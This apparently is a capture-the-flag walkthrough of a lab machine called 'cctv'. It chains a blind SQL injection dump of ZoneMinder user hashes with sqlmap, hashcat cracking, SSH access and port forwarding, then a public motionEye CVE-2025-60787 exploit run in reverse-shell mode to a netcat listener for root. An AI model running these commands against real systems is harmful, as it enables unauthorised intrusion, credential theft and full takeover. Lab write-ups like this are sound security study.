#### infor enum
port 80 and 22 open.
for port 80, a login page, with weak passwd admin/admin
get the version and applicaiton.
  
https://www.exploit-db.com/exploits/41239
  
this is blind sql injection, use sqlmap to do this, and it is preety slow.
  
`└─$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=m5bsd6d9841688q17cf7d9ihma" --dbms=MySQL -D zm -T Users -C Username,Password --dump --batch`
```
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username | Password |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```
the hash type is bcrypt, put the hashes into hash file.

`└─$ hashcat -a 0 -m 3200 hash ~/tools/rockyou.txt `
```
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m:admin
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```
#### foothold
`└─$ ssh mark@cctv.htb `
```
mark@cctv:~$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
```
`mark@cctv:/tmp$ netstat -tnlp`
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1935          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:7999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8554          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9081          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      - 
```

`mark@cctv:/tmp$ curl 127.0.0.1:8765`
```
            <div class="logo">
                <a href="">
                    <span class="logo">motionEye</span>
                    <img class="logo" src="static/img/motioneye-logo.svg">
                </a>
```

https://github.com/motioneye-project/motioneye/tree/main/motioneye, it is cctv  online interface.

`mark@cctv:/tmp$ find / -name *motioneye* 2>/dev/null`
```
/run/motioneye
/run/systemd/units/invocation:motioneye.service
/var/lib/motioneye
/var/log/motioneye
/etc/motioneye
/etc/motioneye/motioneye.conf
/etc/systemd/system/multi-user.target.wants/motioneye.service
/etc/systemd/system/motioneye.service
```
`mark@cctv:/etc/motioneye$ ls`
```
camera-1.conf  motion.conf  motioneye.conf
```

`mark@cctv:/etc/motioneye$ cat motioneye.conf `
```
# path to the configuration directory (must be writable by motionEye)
conf_path /etc/motioneye

# path to the directory where pid files go (must be writable by motionEye)
run_path /run/motioneye

# path to the directory where log files go (must be writable by motionEye)
log_path /var/log/motioneye

# default output path for media files (must be writable by motionEye)
media_path /var/lib/motioneye

# the log level (use quiet, error, warning, info or debug)
log_level info

# the IP address to listen on
# (0.0.0.0 for all interfaces, 127.0.0.1 for localhost)
listen 127.0.0.1

# the TCP port to listen on
port 8765
```

`mark@cctv:/etc/motioneye$ cat motion.conf `
```
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 
```

`mark@cctv:/etc/motioneye$ cat camera-1.conf `
```
netcam_url rtsp://localhost:8554/cam01
```

use port forward to visit it on attack machine.

`└─$ ssh -L 8765:localhost:8765 mark@cctv.htb`

use the hash to login directly to the web. get applicaiton info and version
```
motionEye Version	0.43.1b4
Motion Version	4.7.1
OS Version	Ubuntu 24.04
```
https://github.com/gunzf0x/CVE-2025-60787

#### Es

`└─$ python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.1xxx --port 8821`
```
[*] Attempting to connect to 'http://127.0.0.1:8765' with credentials 'admin:989c5a8ee87a0e9521ec81a79187d162109282f0'
[*] Valid credentials provided
[*] Obtaining cameras available
[*] Found 1 camera(s)
    1) Name: 'CAM 01' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1'
[*] Using camera by default (first one found) for the exploit
[*] Payload successfully injected. Check your shell...
~Happy Hacking
```
`└─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [10.10.16.120] from (UNKNOWN) [10.129.3.75] 37996
bash: cannot set terminal process group (36321): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# id
id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- check listening port
